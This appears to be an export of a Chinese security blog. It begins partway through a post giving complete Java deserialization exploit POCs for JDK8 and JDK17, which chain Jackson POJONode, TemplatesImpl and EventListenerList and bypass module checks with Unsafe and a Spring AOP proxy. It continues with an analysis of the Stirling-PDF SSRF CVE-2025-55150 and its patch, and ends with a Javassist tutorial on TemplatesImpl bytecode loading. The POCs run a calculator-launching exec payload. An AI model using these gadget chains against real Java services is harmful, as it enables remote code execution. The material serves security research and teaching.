//移除writeReplace方法\n        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();\n        jsonNode.toClass(classLoader, null);  //重新加载修改后的类\n        byte[] code1 = getTemplateCode();\n        byte[] code2 = ClassPool.getDefault().makeClass(\"xxx\").toBytecode();\n        TemplatesImpl templates = new TemplatesImpl();\n        Reflections.setFieldValue(templates, \"_bytecodes\",new byte[][]{code1, code2});\n        Reflections.setFieldValue(templates, \"_name\", \"anyStr\");\n        Reflections.setFieldValue(templates, \"_transletIndex\", 0);\n        Reflections.setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl());\n        POJONode pojoNode = new POJONode(templates);\n        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);\n        Field valField = badAttributeValueExpException.getClass().getDeclaredField(\"val\");\n        valField.setAccessible(true);\n        valField.set(badAttributeValueExpException, pojoNode);\n        byte[] data = serialize(badAttributeValueExpException);\n        deserialize(data);\n    }\n    public static byte[] serialize(Object object) throws Exception {\n        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n        ObjectOutputStream oos = new ObjectOutputStream(byteArrayOutputStream);\n        oos.writeObject(object);\n        oos.flush();\n        oos.flush();\n        return byteArrayOutputStream.toByteArray();\n    }\n    public static Object deserialize(byte[] bytes) throws Exception {\n        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);\n        ObjectInputStream ois = new ObjectInputStream(byteArrayInputStream);\n        return ois.readObject();\n    }\n\n}\n\n```\n\n### 4\\. JDK17的封堵与绕过\n\n在`JDK8`中之所以能够利用成功，是因为`BadAttributeValueExpException.readObject`中调用了`valObj.toString()`​。\n\n<img src=\"/resources/ddd6d9560f514f6c9cb5179218e8e110.png\" alt=\"b55f86568c17215cc905f25c4579f4ae.png\" width=\"778\" height=\"294\">\n\n而在`JDK17`的`BadAttributeValueExpException.readObject`中，`valObj.toString()`被移除了。\n\n<img src=\"/resources/0b9ec686dbb7497bbff710f3f316dd89.png\" alt=\"7dd7b9241fcd1334538c2a0dd459ed78.png\" width=\"641\" height=\"172\">\n\n所以我们需要利用2中的`EventListenerList`触发`toString`，来代替`BadAttributeValueExpException`​。\n\n完整POC如下：\n\n```java\npackage ysoserial.xxx;\n\nimport java.io.*;\nimport java.lang.reflect.Field;\nimport java.util.Vector;\nimport javax.swing.event.EventListenerList;\n\nimport javax.swing.undo.UndoManager;\n\nimport com.fasterxml.jackson.databind.node.POJONode;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport javassist.CtMethod;\n\npublic class EventListenerList_polonode {\n    public static void main(String[] args) throws Exception{\n        //删除BaseJsonNode类中的wirteReplace方法\n        ClassPool pool = ClassPool.getDefault();  //创建Javassist的类池对象，用于加载和管理目标类的字节码\n        CtClass jsonNode = pool.get(\"com.fasterxml.jackson.databind.node.BaseJsonNode\");  //从类池中获取BaseJsonNode类的CtClass对象，允许后续修改其字节码\n        CtMethod writeReplace = jsonNode.getDeclaredMethod(\"writeReplace\");  //通过Java反射获取到writeReplace方法\n        jsonNode.removeMethod(writeReplace);  //移除writeReplace方法\n        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();\n        jsonNode.toClass(classLoader, null);  //重新加载修改后的类\n\n        byte[] code1 = getTemplateCode();\n        byte[] code2 = ClassPool.getDefault().makeClass(\"xxx\").toBytecode();\n        TemplatesImpl templates = new TemplatesImpl();\n        setValue(templates, \"_bytecodes\",new byte[][]{code1, code2});\n        setValue(templates, \"_name\", \"anyStr\");\n        setValue(templates, \"_transletIndex\", 0);\n        setValue(templates, \"_tfactory\", new TransformerFactoryImpl());\n        POJONode pojoNode = new POJONode(templates);\n        EventListenerList list = getEventListenerList(pojoNode);\n        byte[] data = serialize(list);\n        deserialize(data);\n    }\n    public static byte[] getTemplateCode() throws Exception {\n        ClassPool pool = ClassPool.getDefault();\n        CtClass template = pool.makeClass(\"MyTemplate\");\n        String block = \"Runtime.getRuntime().exec(\\\"open -a Calculator\\\");\";\n        template.makeClassInitializer().insertBefore(block);\n        return template.toBytecode();\n    }\n    public static EventListenerList getEventListenerList(Object obj) throws Exception{\n        EventListenerList list = new EventListenerList();\n        UndoManager undomanager = new UndoManager();\n\n        //取出UndoManager类的父类CompoundEdit类的edits属性里的vector对象，并把需要触发toString的类add进去。\n        Vector vector = (Vector) getFieldValue(undomanager, \"edits\");\n        vector.add(obj);\n\n        setValue(list, \"listenerList\", new Object[]{Class.class, undomanager});\n        return list;\n    }\n    public static void setValue(Object obj, String name, Object value) throws Exception{\n        Field field = obj.getClass().getDeclaredField(name);\n        field.setAccessible(true);\n        field.set(obj, value);\n    }\n\n    //获取已实例化类中的值\n    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {\n        final Field field = getField(obj.getClass(), fieldName);\n        return field.get(obj);\n    }\n\n    public static Field getField( final Class<?> clazz, final String fieldName ) throws Exception {\n        try {\n            Field field = clazz.getDeclaredField(fieldName);\n            if (field != null)\n                field.setAccessible(true);\n            else if (clazz.getSuperclass() != null)\n                field = getField(clazz.getSuperclass(), fieldName);\n\n            return field;\n        } catch (NoSuchFieldException e) {\n            if (!clazz.getSuperclass().equals(Object.class)) {\n                return getField(clazz.getSuperclass(), fieldName);\n            }\n            throw e;\n        }\n    }\n    public static byte[] serialize(Object object) throws Exception {\n        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n        ObjectOutputStream oos = new ObjectOutputStream(byteArrayOutputStream);\n        oos.writeObject(object);\n        oos.flush();\n        oos.flush();\n        return byteArrayOutputStream.toByteArray();\n    }\n    public static Object deserialize(byte[] bytes) throws Exception {\n        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);\n        ObjectInputStream ois = new ObjectInputStream(byteArrayInputStream);\n        return ois.readObject();\n    }\n\n\n}\n\n```\n\n### 5\\. JAVA JPMS模块检测绕过\n\n从 JDK9 开始，Java 引入了 JPMS（Java Platform Module System，模块系统），模块之间有明确的访问边界。`sun.*, com.sun.*, jdk.internal.*` 通常都算`JDK`内部类，不属于官方公开`API`​；而`java.*, javax.*`包下的类一般都是标准公开`API`​\n\n- 内部 API 封装：以前我们可以随意 `import com.sun.*` 或者 `sun.*` 的内部类，但在JDK17， 这些类已经被模块系统强封装，默认不可访问。\n- 强封装机制：模块之间的可见性由 `module-info.java` 描述，如果某个包没有被exports，外部模块就无法直接访问。\n- 反射限制：在 JDK8 及之前，我们常常通过`setAccessible(true)`绕过 private 限制，反射访问类的私有字段或构造函数。但在 JDK17 里，即使你用 `setAccessible(true)`，也会被`InaccessibleObjectException`拦住，除非在 JVM 启动时手动加`-add-opens`参数开放模块或者使用Java Agent/Instrumentation来打破封装。\n\n因此，jdk17 会进行模块检测导致我们无法直接利用`getOutputProperties`。报错如下：\n\n```java\nException in thread \"main\" java.lang.RuntimeException: com.fasterxml.jackson.databind.exc.InvalidDefinitionException: Invalid type definition for type com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl: Failed to construct BeanSerializer for [simple type, class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl]: (java.lang.IllegalArgumentException) Failed to call setAccess() on Method 'getOutputProperties' (of class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl) due to java.lang.reflect.InaccessibleObjectException, problem: Unable to make public synchronized java.util.Properties com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties() accessible: module java.xml does not \"exports com.sun.org.apache.xalan.internal.xsltc.trax\" to unnamed module @36f0f1be\n\n```\n\n我们可以利用 `Unsafe` 篡改 `Module` 机制，绕过 JDK 的强封装机制。具体为什么能绕过不太懂，可见https://xz.aliyun.com/news/18628\n\n```java\nprivate static Method getMethod(Class clazz, String methodName, Class[]\n            params) {\n        Method method = null;\n        while (clazz!=null){\n            try {\n                method = clazz.getDeclaredMethod(methodName,params);\n                break;\n            }catch (NoSuchMethodException e){\n                clazz = clazz.getSuperclass();\n            }\n        }\n        return method;\n    }\n    private static Unsafe getUnsafe() {\n        Unsafe unsafe = null;\n        try {\n            Field field = Unsafe.class.getDeclaredField(\"theUnsafe\");\n            field.setAccessible(true);\n            unsafe = (Unsafe) field.get(null);\n        } catch (Exception e) {\n            throw new AssertionError(e);\n        }\n        return unsafe;\n    }\n    public void bypassModule(ArrayList<Class> classes){\n        try {\n            Unsafe unsafe = getUnsafe();\n            Class currentClass = this.getClass();\n            try {\n                Method getModuleMethod = getMethod(Class.class, \"getModule\", new\n                        Class[0]);\n                if (getModuleMethod != null) {\n                    for (Class aClass : classes) {\n                        Object targetModule = getModuleMethod.invoke(aClass, new\n                                Object[]{});\n                        unsafe.getAndSetObject(currentClass,\n                                unsafe.objectFieldOffset(Class.class.getDeclaredField(\"module\")), targetModule);\n                    }\n                }\n            }catch (Exception e) {\n            }\n        }catch (Exception e){\n            e.printStackTrace();\n        }\n    }\n    \n```\n\n我们在调用Jackson链，调用任意类的getter方法时，由于getter方法优先级顺序不稳定的原因，会导致Jackson链也会具有不稳定性，我们可以使用`JdkDynamicAopProxy`来解决Jackson链的不稳定性。\n\nJackson链不稳定性解决可以看：[Jackson中getter触发不稳定问题](http://101.36.122.13:4000/2025/08/28/Jackson%E4%B8%ADgetter%E8%A7%A6%E5%8F%91%E4%B8%8D%E7%A8%B3%E5%AE%9A%E9%97%AE%E9%A2%98/)\n\n同时，我们知道在Jackson反序列化中，会先调用`TemplatesImpl`类的构造方法，再去调用其getter方法，而`TemplatesImpl`在`com.sun.org.apache.xalan.internal.xsltc.trax`包下，同样受到**内部 API 封装**的限制，我们使用`Aop`代理后，其对外暴露的接口为`javax.xml.transform.Templates`，`java.xml`模块是不受限的，因此可以利用以下代码绕过**模块检测。**\n\n```java\npublic static Object templatesImplAopProxy(TemplatesImpl templates) throws Exception{\n        AdvisedSupport advisedSupport = new AdvisedSupport();\n        advisedSupport.setTarget(templates);\n        Constructor constructor = Class.forName(\"org.springframework.aop.framework.JdkDynamicAopProxy\").getConstructor(AdvisedSupport.class);\n        constructor.setAccessible(true);\n        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(advisedSupport);\n        Object proxy = Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader(), new Class[]{Templates.class}, invocationHandler);\n        return proxy;\n    }\n\n\n```\n\n所以完整POC如下：\n\n```java\npackage org.example;\n\nimport javax.swing.event.EventListenerList;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.reflect.Field;\nimport javax.swing.undo.UndoManager;\nimport java.util.Base64;\nimport java.util.Vector;\nimport java.util.ArrayList;\nimport com.fasterxml.jackson.databind.node.POJONode;\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;\nimport sun.misc.Unsafe;\nimport java.lang.reflect.Method;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport javassist.CtMethod;\nimport org.springframework.aop.framework.AdvisedSupport;\nimport javax.xml.transform.Templates;\nimport java.lang.reflect.*;\n\n// --add-opens=java.base/sun.nio.ch=ALL-UNNAMED\n// --add-opens=java.base/java.lang=ALL-UNNAMED\n// --add-opens=java.base/java.io=ALL-UNNAMED\n// --add-opens=jdk.unsupported/sun.misc=ALL-UNNAMED\n// --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED\n// --add-opens=java.base/java.lang.reflect=ALL-UNNAMED\npublic class SpringRCE {\n    public static void main(String[] args) throws Exception{\n        // 删除writeReplace保证正常反序列化\n        try {\n            ClassPool pool = ClassPool.getDefault();\n            CtClass jsonNode = pool.get(\"com.fasterxml.jackson.databind.node.BaseJsonNode\");\n            CtMethod writeReplace = jsonNode.getDeclaredMethod(\"writeReplace\");\n            jsonNode.removeMethod(writeReplace);\n            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();\n            jsonNode.toClass(classLoader, null);\n        } catch (Exception e) {\n        }\n\n        // 把模块强行修改，切换成和目标类一样的 Module 对象\n        ArrayList<Class> classes = new ArrayList<>();\n        classes.add(TemplatesImpl.class);\n        classes.add(POJONode.class);\n        classes.add(EventListenerList.class);\n        classes.add(SpringRCE.class);\n        classes.add(Field.class);\n        classes.add(Method.class);\n        new SpringRCE().bypassModule(classes);\n\n        // ===== EXP 构造 =====\n        byte[] code1 = getTemplateCode();\n        byte[] code2 = ClassPool.getDefault().makeClass(\"fushuling\").toBytecode();\n\n        TemplatesImpl templates = new TemplatesImpl();\n        setFieldValue(templates, \"_name\", \"xxx\");\n        setFieldValue(templates, \"_bytecodes\", new byte[][]{code1, code2});\n        setFieldValue(templates,\"_transletIndex\",0);\n\n        POJONode node = new POJONode(makeTemplatesImplAopProxy(templates));\n\n        EventListenerList eventListenerList = getEventListenerList(node);\n\n        serialize(eventListenerList, true);\n    }\n\n    public static byte[] serialize(Object obj, boolean flag) throws Exception {\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        ObjectOutputStream oos = new ObjectOutputStream(baos);\n        oos.writeObject(obj);\n        oos.close();\n        if (flag) System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));\n        return baos.toByteArray();\n    }\n\n    public static Object makeTemplatesImplAopProxy(TemplatesImpl templates) throws Exception {\n        AdvisedSupport advisedSupport = new AdvisedSupport();\n        advisedSupport.setTarget(templates);\n        Constructor constructor = Class.forName(\"org.springframework.aop.framework.JdkDynamicAopProxy\").getConstructor(AdvisedSupport.class);\n        constructor.setAccessible(true);\n        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);\n        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);\n        return proxy;\n    }\n    public static byte[] getTemplateCode() throws Exception {\n        ClassPool pool = ClassPool.getDefault();\n        CtClass template = pool.makeClass(\"MyTemplate\");\n        String block = \"Runtime.getRuntime().exec(\\\"open -a Calculator\\\");\";\n        template.makeClassInitializer().insertBefore(block);\n        return template.toBytecode();\n    }\n\n    public static EventListenerList getEventListenerList(Object obj) throws Exception{\n        EventListenerList list = new EventListenerList();\n        UndoManager undomanager = new UndoManager();\n\n        //取出UndoManager类的父类CompoundEdit类的edits属性里的vector对象，并把需要触发toString的类add进去。\n        Vector vector = (Vector) getFieldValue(undomanager, \"edits\");\n        vector.add(obj);\n\n        setFieldValue(list, \"listenerList\", new Object[]{Class.class, undomanager});\n        return list;\n    }\n\n    private static Method getMethod(Class clazz, String methodName, Class[]\n            params) {\n        Method method = null;\n        while (clazz!=null){\n            try {\n                method = clazz.getDeclaredMethod(methodName,params);\n                break;\n            }catch (NoSuchMethodException e){\n                clazz = clazz.getSuperclass();\n            }\n        }\n        return method;\n    }\n    private static Unsafe getUnsafe() {\n        Unsafe unsafe = null;\n        try {\n            Field field = Unsafe.class.getDeclaredField(\"theUnsafe\");\n            field.setAccessible(true);\n            unsafe = (Unsafe) field.get(null);\n        } catch (Exception e) {\n            throw new AssertionError(e);\n        }\n        return unsafe;\n    }\n    public void bypassModule(ArrayList<Class> classes){\n        try {\n            Unsafe unsafe = getUnsafe();\n            Class currentClass = this.getClass();\n            try {\n                Method getModuleMethod = getMethod(Class.class, \"getModule\", new\n                        Class[0]);\n                if (getModuleMethod != null) {\n                    for (Class aClass : classes) {\n                        Object targetModule = getModuleMethod.invoke(aClass, new\n                                Object[]{});\n                        unsafe.getAndSetObject(currentClass,\n                                unsafe.objectFieldOffset(Class.class.getDeclaredField(\"module\")), targetModule);\n                    }\n                }\n            }catch (Exception e) {\n            }\n        }catch (Exception e){\n            e.printStackTrace();\n        }\n    }\n    public static Object getFieldValue(Object obj, String fieldName) throws Exception {\n        Field field = null;\n        Class c = obj.getClass();\n        for (int i = 0; i < 5; i++) {\n            try {\n                field = c.getDeclaredField(fieldName);\n            } catch (NoSuchFieldException e) {\n                c = c.getSuperclass();\n            }\n        }\n        field.setAccessible(true);\n        return field.get(obj);\n    }\n    public static void setFieldValue(Object obj, String field, Object val) throws Exception {\n        Field dField = obj.getClass().getDeclaredField(field);\n        dField.setAccessible(true);\n        dField.set(obj, val);\n    }\n}\n```","tags":["Java","反序列化"],"categories":["攻击技术"]},{"title":"Stirling-PDF 服务端请求伪造漏洞(CVE-2025-55150)","url":"/2024/07/21/Stirling-PDF-服务端请求伪造漏洞-CVE-2025-55150/","content":"\n## 一、漏洞复现\n\n[Stirling-PDF](https://github.com/Stirling-Tools/Stirling-PDF) v1.0.1\n\n<img src=\"/resources/9e2ac6d6605548e28f1f32b6534dd506.png\" alt=\"658e04c706d8b9f4932e63ffc0528dc0.png\" width=\"532\" height=\"263\" class=\"jop-noMdConv\">\n\n<img src=\"/resources/ea4fed99c2d04792a0129e5f37822416.png\" alt=\"3a3736842228f731e8384ae39014f746.png\" width=\"531\" height=\"275\" class=\"jop-noMdConv\">\n\n## 二、漏洞分析\n\n该项目是Spring BOOT架构，定位到漏洞所在Controller——**ConvertHtmlToPDF**。简单看下控制器逻辑，是一个将HTML文件转换成PDF文件的接口。接受到文件名、内容等信息后，将这些参数传\\*\\*FileToPdf.convertHtmlToPdf()\\*\\*方法中。\n\n<img src=\"/resources/8766f43fed554dfc90c10e92ce539130.png\" alt=\"c9a0c12453aa4afc6e2e6223f98e3cf6.png\" width=\"476\" height=\"404\" class=\"jop-noMdConv\">\n\n跟进继续看，首先会调用**sanitizeHtmlContent**方法，最终会执行到**CustomHtmlSanitizer#sanitize**，核心是 HTML 内容的清理（Sanitize）逻辑，用于防止 XSS 等注入攻击。`<iframe>`、`<script>`等都会被默认去掉，但是`<img>`依然可用。\n\n<img src=\"/resources/1a004b479b9f435387f4c00d46f1b948.png\" alt=\"b3e9004e64fa4e46ccc2f9e658e83c25.png\" width=\"474\" height=\"387\" class=\"jop-noMdConv\">\n\n通过了清理逻辑之后，接下来就是命令执行逻辑了。Stirling-PDF是内置了[WeasyPrint](https://github.com/Kozea/WeasyPrint)插件，本质上就是通过构造Command数组，通过**ProcessBuilder.start**用插件将HTML转成PDF。\n\n<img src=\"/resources/4eaef0f51d5a4272b0a65eb56423839f.png\" alt=\"f506014895d46ee7d3357756455f4414.png\" width=\"470\" height=\"454\" class=\"jop-noMdConv\">\n\n其实看到这，就会发现本质上还是 [WeasyPrint](https://github.com/Kozea/WeasyPrint) 插件得问题，[Stirling-PDF](https://github.com/Stirling-Tools/Stirling-PDF) v1.0.1版本内置的 [WeasyPrint](https://github.com/Kozea/WeasyPrint) 插件为65.1，最新版本为66.0。\n\n那么问题只剩下一个了：[WeasyPrint](https://github.com/Kozea/WeasyPrint) 是否修复了这个问题？下图可见最新版本同样存在这个问题，在转换过程中会远程加载`<img>`中的图片链接导致SSRF。\n\nWeasyPrint 是基于 Requests + CairoSVG 的，默认会联网下载外部资源。但其所依赖的库中没有能伪造图片RCE的历史漏洞或者调用除http(s)其他协议的漏洞，所以漏洞危害程度较低。\n\n<img src=\"/resources/9acc320b2a374ad18a9d1556cde1a398.png\" alt=\"8666e409fbdc38e3d95f10d45337c1f8.png\" width=\"602\" height=\"376\" class=\"jop-noMdConv\">\n\n## 三、补丁分析\n\n[Stirling-PDF](https://github.com/Stirling-Tools/Stirling-PDF) 官方在web层面对传入的HTML文件实施了进一步[修复过滤](https://github.com/Stirling-Tools/Stirling-PDF/commit/7d6b70871bad2a3ff810825f7382c49f55293943)，用来检查一个URL是否允许访问，按照不同安全等级进行过滤。配置文件**settings.yml.template**里默认防护等级为MEDIUM，拒绝黑名单、私有IP网段、本地地址、云厂商元数据IP的访问。\n\n<img src=\"/resources/8c704a2148284c43964454b65df5f99e.png\" alt=\"4b3fd7c7cce05489d0acefa2575e09c7.png\" width=\"457\" height=\"438\" class=\"jop-noMdConv\">\n\n&nbsp;","tags":["vulnerability"],"categories":["漏洞分析"]},{"title":"TemplatesImpl利用链分析","url":"/2022/11/10/TemplatesImpl利用链分析/","content":"\n# 前言\n\n在学习`java cc2`链的时候看到利用`TemplatesImpl`，记得之前在`fastjson`反序列化的时候也遇到过，所以就想着单独写个`TemplatesImpl`利用链分析的文章。\n\n# 自定义类加载器\n\n在编写类加载器的时候需要的条件有：\n\n1.  继承`ClassLoader`类\n2.  重写`findClass`方法\n3.  在findClass方法中调用defineClass方法来定义一个类\n\n当然，上述条件中我们不是一定要重写`findClass`方法的，我们也可以重写`loadClass`，只不过这样可能会破坏“双亲委派”机制，而且通过查看`ClassLoader.findClass`方法也可以明白为什么重写`findClass`（抛出异常的空方法）\n\n<img src=\"/resources/a270005845fc44bbac368335ad542d6c.png\" alt=\"ab552a5906522a4a6238aad508d574f8.png\" width=\"856\" height=\"255\" class=\"jop-noMdConv\">\n\n在之前的文章中，我们通过文件读取`class`文件来获取字节码并进行自定义加载，但是这样操作起来难免会有些不方便，所以有没有一种方法可以直接通过`java`文件来直接获取字节码，确实可以这样，这里就需要学习一下`javasist`\n\n# javasist\n\n首先我们在`pom.xml`里边添加一下依赖：\n\n```xml\n<dependency>\n    <groupId>org.javassist</groupId>\n    <artifactId>javassist</artifactId>\n    <version>3.22.0-GA</version>\n</dependency>\n```\n\n通常我们需要将`.java`文件编译成`.class`才能正常执行，在命名行中我们通常使用`javac`来编译，`javasist`是一个处理字节码的类库，能够动态修改`class`字节码文件，也可以直接读取到一个`java`类的字节码，现在来简单学习一下它的常用用法：\n\n`Javassist`中最为重要的是`ClassPool`、`CtClass`、`CtMethod`、`CtField`以及`CtConstructor`这几类。\n\n```\nCtClass: 一个CtClass(编译时类)对象可以处理一个class文件, 这些CtClass对象可以从ClassPool获得\nClassPool: CtClass对象的容器, 其中键是类名称， 值是表示该类的CtClass对象\nCtMethods: 表示类中的方法\nCtFields: 表示类中的字段\nCtConstructor：标识类中的构造器\n```\n\n创建ClassPool对象作为CtClass的容器：\n\n```java\npublic ClassPool(boolean useDefaultPath) {}\n// ClassPool pool = new ClassPool(true);\npublic static synchronized ClassPool getDefault() {}\n// 效果与 new ClassPool(true) 一致\n// ClassPool pool = ClassPool.getDefault();\n```\n\n获取指定类名的CtClass类对象：\n\n```java\npublic CtClass getCtClass(String classname) throws NotFoundException {}\n\n```\n\n销毁ClassPool容器里的CtClass类对象：\n\n```java\npublic void detach(){}\n```\n\n创建一个CtClass类对象：\n\n```java\npublic CtClass makeClass(String classname) throws RuntimeException {}\n// CtClass test = pool.makeClass(\"Test\");\npublic CtClass makeClass(InputStream classfile) throws IOException, RuntimeException {}\n// pool.makeClass(new FileInputStream(new File(\"Test.class\")))\n\n```\n\n获取CtClass类对象:\n\n```java\npublic CtClass[] get(String[] classnames) throws NotFoundException {}\n// pool.get(TestInterface.class.getName())\n```\n\n将`ClassPath`加到类搜索路径的末尾位置 or插入到起始位置。通常通过该方法写入额外的类搜索路径，以解决多个类加载器环境中找不到类：\n\n```java\n// 起始位置插入\npool.insertClassPath(new ClassClassPath(this.getClass()));\n// 末尾位置插入\npool.appendClassPath(new ClassClassPath(this.getClass()));\n\n```\n\n设置需要继承的类：\n\n```java\npublic void setSuperclass(CtClass clazz) throws CannotCompileException {}\n// test.setSuperclass(pool.get(TestClass.class.getName()));\n\n```\n\n设置和添加需要实现的接口：\n\n```java\npublic void setInterfaces(CtClass[] list) {}\n// test.setSuperclass(pool.get(TestInterface.class.getName()));\npublic void addInterface(CtClass anInterface) {}\n// // test.addInterface((pool.get(TestInterface.class.getName()));\n```\n\n构造器相关操作：\n\n```java\n// 创建空构造器\npublic CtConstructor makeClassInitializer() throws CannotCompileException {}\n// 添加构造器\npublic void addConstructor(CtConstructor c) throws CannotCompileException {}\n// 删除构造器\npublic void removeConstructor(CtConstructor c) throws NotFoundException {}\n```\n\n将java语句插入：\n\n```java\n// 插入java语句\npublic void insertBefore(String src) throws CannotCompileException {}\n// ctConstructor.insertBefore(\"System.out.println(\\\"Hello\\\");\")\n// 设置java语句\npublic void setBody(String src) throws CannotCompileException {}\n// ctConstructor.setBody(\"System.out.println(\\\"Hello\\\");\")\n```\n\n将编译的类创建为.class文件\n\n```java\npublic void writeFile() throws NotFoundException, IOException, CannotCompileException {}\n//test.writeFile();\n```\n\n# 使用示例\n\n以上方法只是小部分，还没有涉及方法、字段及构造器等诸多操作，现在使用刚才学习的这些方法来生成一个类`.class`文件，编写代码如下：\n\n```java\npackage com.serializable.cc2;\n\nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;\nimport javassist.ClassClassPath;\nimport javassist.ClassPool;\nimport javassist.CtClass;\nimport javassist.CtConstructor;\n\npublic class MakeCtClass {\n    public static void main(String[] args) throws Exception {\n        ClassPool aDefault = ClassPool.getDefault();\n        CtClass testCtClass = aDefault.makeClass(\"TestCtClass\");\n        aDefault.insertClassPath(new ClassClassPath(AbstractTranslet.class));\n        testCtClass.setSuperclass(aDefault.get(AbstractTranslet.class.getName()));\n        CtConstructor ctConstructor = testCtClass.makeClassInitializer();\n        ctConstructor.insertBefore(\"Runtime.getRuntime().exec(\\\"calc\\\");\");\n        testCtClass.writeFile();\n    }\n}\n\n```\n\n然后我们执行后将会在根目录生成`TestCtClass.class`文件\n\n[![](/resources/2524a1a35b0c4b27be8ec879b92c6eca.png)](https://img2023.cnblogs.com/blog/2410932/202301/2410932-20230121233630232-1811464882.png)\n\n这里发现写进去的java语句是用`static`进行修饰的，`static`关键字在平时我们经常用于修饰变量或者方法，然后将它们叫做**静态变量**或静态方法，如果向上图所示那样，则是使用`static`关键字用于代码块，叫做**静态代码块**，当JVM加载该类时候就会执行这些静态代码块。\n\n这里我想要通过自定义类加载器去加载这个类，先编写简单的自定义类加载器`TestClassLoader`：\n\n```java\npackage com.serializable.cc2;\n\nimport java.io.*;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class TestClassLoader extends ClassLoader {\n    @Override\n    protected Class<?> findClass(String name) throws ClassNotFoundException {\n        Class<?> c = findLoadedClass(name);\n        if (c == null) {\n            String path = name + \".class\";\n            byte[] classData = null;\n            try {\n                classData = Files.readAllBytes(Paths.get(path));\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            c = defineClass(name, classData, 0, classData.length);\n        }\n        return c;\n    }\n}\n\n```\n\n然后使用这个加载器去加载刚刚生成的`TestCtClass.class`，编写`LoadTestClass`\n\n```java\npackage com.serializable.cc2;\n\n\nimport java.lang.reflect.Constructor;\n\npublic class LoadTestClass {\n    public static void main(String[] args) throws Exception {\n        ClassLoader classLoader = new TestClassLoader();\n        Class<?> testCtClass = classLoader.loadClass(\"TestCtClass\");\n        System.out.println(testCtClass);\n    }\n}\n\n```\n\n这里我本以为执行过后会弹出计算器，但是结果却和我想的不一样\n\n> 不是说当JVM加载一个类的时候会执行它的static静态代码块的吗？\n\n当我通过反射进行初始化该类的时候才弹出了计算器，添加了如下代码：\n\n```java\ntestCtClass.getConstructor().newInstance();\t\n```\n\n这时我突然对这个问题很好奇，也对之前学习Java类加载过程的内容标识怀疑！\n\n* * *\n\n经过向大佬请教，之前我们对类加载的理解也并没有问题，静态代码块确实是在JVM加载该类的时候执行，但是这里容易混淆，Java类加载按大了分为三个步骤：加载、链接、初始化！类加载和加载并不能混为一谈，按照之前的说法，JVM加载类包括以上的三个步骤，但是执行静态代码块的时候并不是在加载的这一个环节，而是在类加载的初始化环节！\n\n这里还学习到了一个知识点，一个类初始化的三种方法：\n\n1.  静态初始化\n2.  匿名初始化\n3.  构造方法初始化\n\n它们在类加载的过程中按照以上顺序执行，写个代码就懂了：\n\n```java\npublic class User {\n    static {\n        System.out.println(\"static\");\n    }\n    {\n        System.out.println(\"Empty\");\n    }\n    public User() {\n        System.out.println(\"User\");\n    }\n}\n\n```\n\n通过不同方式去加载上边的这个`User`类\n\n```java\npublic class Test {\n    public static void main(String[] args) throws Exception {\n        System.out.println(\"forName方法，initialize 为false，不进行初始化:\");\n        Class.forName(\"User\", false, ClassLoader.getSystemClassLoader());\n        System.out.println(\"forName方法，进行初始化：\");\n        Class.forName(\"User\");\n        System.out.println(\"进行实例化：\");\n        new User();\n    }\n}\n\n```\n\n[![](/resources/88a3d3214eb14a30bebd500cf7121f38.png)](https://img2023.cnblogs.com/blog/2410932/202301/2410932-20230121233630843-299857451.png)\n\n这里发现实例化的时候没有输出static，因为类加载的时候静态代码块只执行一次：\n\n```java\npublic class Test {\n    public static void main(String[] args) throws Exception {\n        System.out.println(\"进行实例化：\");\n        new User();\n    }\n}\n\n```\n\n[![](/resources/ec04749b2af24bb38048a124bc2be4c2.png)](https://img2023.cnblogs.com/blog/2410932/202301/2410932-20230121233631446-911626772.png)\n\n* * *\n\n继续回到刚才使用自定义加载器去加载`TestCtClass.class`，这个过程中并不包括初始化操作（也不包括链接过程，只是类加载过程中的加载步骤），所以就不会执行静态代码块\n\n[![](/resources/8be645cb96154c079fa85f33f1b3a9a4.png)](https://img2023.cnblogs.com/blog/2410932/202301/2410932-20230121233632159-1310529553.png)\n\n# TemplatesImpl加载字节码\n\n说了这么多，终于切入正题了，`TemplatesImep`利用链的核心就是可以恶意加载字节码，因为该类中存在一个内部类`TransletClassLoader`，该类继承了`ClassLoader`并且重写了`loadClass`，我们可以通过这个类加载器进行加载字节码。因为是内部类，无法在外部进行调用，所以我们看一看哪个方法使用了这个类。\n\n[![](/resources/3f46f291629740b787109d8dd39630dc.png)](https://img2023.cnblogs.com/blog/2410932/202301/2410932-20230121233632710-1022601410.png)\n\n查看`TransletClassLoader#defineTransletClasses`\n\n<img src=\"/resources/9abc9c7c1c4b497aabc7d328006c89cf.png\" alt=\"bf6ce6ee16b63b92ae441584f394813e.png\" width=\"1031\" height=\"349\" 